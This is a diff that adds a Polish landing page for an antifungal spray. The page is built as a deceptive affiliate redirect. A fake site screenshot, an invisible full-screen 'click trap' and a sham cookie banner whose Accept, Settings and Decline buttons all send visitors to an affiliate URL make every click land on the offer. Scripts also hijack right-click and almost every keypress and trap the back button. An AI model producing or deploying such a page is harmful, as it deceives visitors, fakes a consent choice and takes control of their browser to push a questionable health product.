@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SKINATRIN - Oficjalna Strona</title>
+    <meta name="description" content="SKINATRIN - Skuteczny spray przeciwko grzybicy">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            position: relative;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        /* Background screenshot */
+        .site-screenshot {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            cursor: pointer;
+        }
+        
+        .site-screenshot-desktop {
+            width: 100%;
+            height: 100%;
+            background-image: url('screenshot-desktop.jpg');
+            background-size: cover;
+            background-position: top center;
+            background-repeat: no-repeat;
+            display: block;
+        }
+        
+        .site-screenshot-mobile {
+            display: none;
+            width: 100%;
+            height: 100%;
+            background-image: url('screenshot-mobile.jpg');
+            background-size: cover;
+            background-position: top center;
+            background-repeat: no-repeat;
+        }
+        
+        /* Dark overlay/shade for background */
+        .overlay-blur {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(3px);
+            z-index: 9998;
+            cursor: pointer;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        /* Cookie Banner - CENTERED */
+        .cookie-banner {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #ffffff;
+            box-shadow: 0 10px 50px rgba(0, 0, 0, 0.3);
+            padding: 30px;
+            z-index: 10000;
+            animation: scaleIn 0.4s ease;
+            border-radius: 12px;
+            max-width: 600px;
+            width: 90%;
+        }
+        
+        @keyframes scaleIn {
+            from { 
+                transform: translate(-50%, -50%) scale(0.8);
+                opacity: 0;
+            }
+            to { 
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 1;
+            }
+        }
+        
+        @keyframes slideUp {
+            from { 
+                transform: translateY(100%);
+                opacity: 0;
+            }
+            to { 
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        
+        .cookie-container {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        
+        .cookie-content {
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+        }
+        
+        .cookie-icon {
+            font-size: 36px;
+            min-width: 36px;
+        }
+        
+        .cookie-text {
+            flex: 1;
+        }
+        
+        .cookie-text h3 {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: #222;
+        }
+        
+        .cookie-text p {
+            font-size: 14px;
+            line-height: 1.6;
+            color: #555;
+        }
+        
+        .cookie-buttons {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        
+        .cookie-btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            white-space: nowrap;
+        }
+        
+        .cookie-accept {
+            background: #20B2AA;
+            color: white;
+        }
+        
+        .cookie-accept:hover {
+            background: #1a9690;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(32, 178, 170, 0.3);
+        }
+        
+        .cookie-settings {
+            background: transparent;
+            color: #666;
+            border: 2px solid #ddd;
+        }
+        
+        .cookie-settings:hover {
+            background: #f8f9fa;
+            border-color: #20B2AA;
+            color: #20B2AA;
+        }
+        
+        .cookie-decline {
+            background: transparent;
+            color: #999;
+            text-decoration: underline;
+            padding: 12px 16px;
+        }
+        
+        .cookie-decline:hover {
+            color: #666;
+        }
+        
+        /* Mobile styles */
+        @media (max-width: 768px) {
+            .site-screenshot-desktop {
+                display: none;
+            }
+            
+            .site-screenshot-mobile {
+                display: block;
+            }
+            
+            .cookie-banner {
+                padding: 25px 20px;
+                width: 95%;
+                max-width: none;
+            }
+            
+            .cookie-container {
+                gap: 20px;
+            }
+            
+            .cookie-buttons {
+                flex-direction: column;
+                width: 100%;
+            }
+            
+            .cookie-btn {
+                width: 100%;
+                padding: 14px;
+                font-size: 16px;
+            }
+            
+            .cookie-text h3 {
+                font-size: 18px;
+            }
+            
+            .cookie-text p {
+                font-size: 14px;
+            }
+        }
+        
+        /* Click trap overlay */
+        .click-trap {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            cursor: pointer;
+        }
+        
+    </style>
+</head>
+<body>
+    <!-- Site Screenshot Background -->
+    <div class="site-screenshot" onclick="redirectToOffer()">
+        <div class="site-screenshot-desktop"></div>
+        <div class="site-screenshot-mobile"></div>
+    </div>
+    
+    <!-- Blur Overlay -->
+    <div class="overlay-blur" onclick="redirectToOffer()"></div>
+    
+    <!-- Click Trap (invisible but catches all clicks) -->
+    <div class="click-trap" onclick="redirectToOffer()"></div>
+    
+    <!-- Cookie Banner -->
+    <div class="cookie-banner" id="cookieBanner">
+        <div class="cookie-container">
+            <div class="cookie-content">
+                <div class="cookie-icon">🍪</div>
+                <div class="cookie-text">
+                    <h3>Ta strona używa plików cookie</h3>
+                    <p>Używamy plików cookie, aby poprawić Twoje wrażenia z przeglądania, wyświetlać spersonalizowane reklamy lub treści oraz analizować nasz ruch. Klikając „Akceptuj wszystko", wyrażasz zgodę na używanie przez nas plików cookie.</p>
+                </div>
+            </div>
+            <div class="cookie-buttons">
+                <button class="cookie-btn cookie-accept" onclick="redirectToOffer()">
+                    Akceptuj wszystko
+                </button>
+                <button class="cookie-btn cookie-settings" onclick="redirectToOffer()">
+                    Ustawienia
+                </button>
+                <button class="cookie-btn cookie-decline" onclick="redirectToOffer()">
+                    Odrzuć
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Affiliate link - REPLACE WITH ACTUAL LINK
+        const AFFILIATE_LINK = 'https://bestbargains24x7.com/skinatrin-offer';
+        
+        // Redirect function - ALL clicks go to offer
+        function redirectToOffer() {
+            // Small delay for realism
+            setTimeout(() => {
+                window.location.href = AFFILIATE_LINK;
+            }, 100);
+        }
+        
+        // Auto-show cookie banner after 1 second
+        setTimeout(() => {
+            const banner = document.getElementById('cookieBanner');
+            if (banner) {
+                banner.style.display = 'block';
+            }
+        }, 1000);
+        
+        // Prevent right-click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            redirectToOffer();
+            return false;
+        });
+        
+        // Prevent text selection
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Handle back button - keep user on page
+        window.history.pushState(null, null, window.location.href);
+        window.onpopstate = function() {
+            window.history.go(1);
+        };
+        
+        // Any keyboard press also redirects
+        document.addEventListener('keydown', function(e) {
+            // Except for essential keys like Tab for accessibility
+            if (e.key !== 'Tab') {
+                e.preventDefault();
+                redirectToOffer();
+            }
+        });
+    </script>
+</body>
+</html>
